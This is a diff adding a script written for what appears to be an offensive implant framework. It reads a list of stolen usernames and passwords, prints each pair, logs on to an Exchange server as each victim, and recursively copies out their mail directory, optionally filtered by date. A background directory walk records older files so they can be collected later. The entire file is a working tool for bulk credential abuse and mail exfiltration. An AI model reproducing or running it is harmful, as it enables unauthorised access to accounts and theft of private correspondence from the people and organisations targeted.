@@ -1,0 +1,145 @@
+#---------------------------------------------------------------------------
+# Exchange_collect.eps - collects mail from an exchange server
+# Input: script takes in a file in the form
+#		user,password,date[optional]
+#		user,password,date[optional]
+#		user,password,date[optional]
+#---------------------------------------------------------------------------
+@include "Ops_GenericFunctions.dsi";
+
+string $commandLineOption;
+string $temp;
+int $counter = 0;
+int $alertSize = 2000000;
+
+#--------------------------------------------------------
+# Parse the command line options
+#--------------------------------------------------------
+while (defined($argv[$counter])) {
+	RegExSplit("-", $argv[$counter], 0, $temp);
+	$counter += 1;
+
+	if (defined($temp[1])) {
+		$commandLineOption = $temp[1];
+
+		if (($commandLineOption == "h") || ($commandLineOption == "help") || ($commandLineOption == "?")) {
+			echo "\nUsage: script exchange_mail.eps _Options_";
+			echo "  Gets the mail from an exchange server";
+			echo "\nOptions:";
+			echo "  [-alert]";
+			echo "     Alert the user to any file larger than filesize.  Default = 2000000";
+			return true;
+		} else {
+			if (defined($argv[$counter])) {
+				if ($commandLineOption == "alert") {
+					$alertSize = <int>$argv[$counter];
+				}
+
+				$counter++;
+			} else {
+				echo "OPTION $temp[1] requires data (-h for help)";
+				return true;
+			}
+		}
+	}
+}
+
+string $delimeter=",";
+string $mailDirectory;
+string $inputFile;
+string $lines;
+
+echo "\n  ## File should have the following format ##";
+echo "##      user,password,date[optional]     ##";
+echo "##      user,password,date[optional]     ##";
+echo "##      user,password,date[optional]     ##\n";
+
+GetInput("Enter the input file (absolute path):", $inputFile);
+GetInput("Enter the exchange directory (absolute path):", $mailDirectory);
+
+Ops_FixDirectoryInput($inputFile);
+Ops_FixDirectoryInput($mailDirectory);
+
+if (ReadFile($inputFile,$lines)) {
+	string $values;
+	string $tempUser;
+	string $tempPassword;
+	string $tempDate;
+
+	string $line;
+	int $lineNum = 1;
+
+	for(int $i=0; $i<sizeof($lines); $i++) {
+		$line = $lines[$i];
+		#$tempUser = "";
+		#$tempPassword = "";
+		undef($tempDate);
+
+		RegExSplit($delimeter, $line, 0, $values);
+
+		if ((defined($values[0])) && (defined($values[1]))) {
+			$tempUser = $values[0];
+			Ops_LeftTrim($tempUser);
+
+			$tempPassword = $values[1];
+			Ops_LeftTrim($tempPassword);
+
+			if (defined($values[2])) {
+				$tempDate = $values[2];
+				Ops_LeftTrim($tempDate);
+			}
+
+			getMail($tempUser, $tempPassword, $tempDate, $mailDirectory, $alertSize);
+		} else {
+			echo "Error on Line $lineNum";
+		}
+
+		$lineNum += 1;
+	}
+}
+
+return true;
+
+#---------------------------------------------------------------------------
+# Set the user and get mail (from Exchange)
+#---------------------------------------------------------------------------
+Sub getMail(IN string $user, IN string $password, IN string $mailDate, IN string $mailDir, IN int $alertSize) {
+	echo "\n  ****************************************************";
+	if (defined($mailDate)) {
+		echo "* USER: $user  PASSWORD: $password  DATE: $mailDate";
+	} else {
+		echo "* USER: $user  PASSWORD: $password  DATE: ALL";
+	}
+	echo "****************************************************";
+
+	@record on;
+	if (`logonasuser -user $user -password $password -type network`) {
+		@record off;
+
+		#int $logonasuserID;
+		#GetCmdData("LastCommandId", $logonasuserID);
+
+		if (defined($mailDate)) {
+			# script pulls a full dirwalk in addition to the targetted dirwalk incase anyone wants
+	       		# to task one of the older files for future collection
+			`background log dir * -path "$mailDir\\$user" -recursive -max 0`;
+
+			if (!`user=$user dirget -path "$mailDir\\$user" -mask *.* -recursive -after $mailDate -alert $alertSize`) {
+				return false;
+			}
+		} else {
+			if (!`user=$user dirget -path "$mailDir\\$user" -mask *.* -recursive -alert $alertSize`) {
+				return false;
+			}
+		}
+
+		echo "\nWAIT UNTIL RECURSIVE GET COMPLETES BEFORE CONTINUING";
+		pause;
+
+		@echo off;
+		`stop logonasuser`;
+	} else {
+		@record off;
+		pause;
+	}
+}
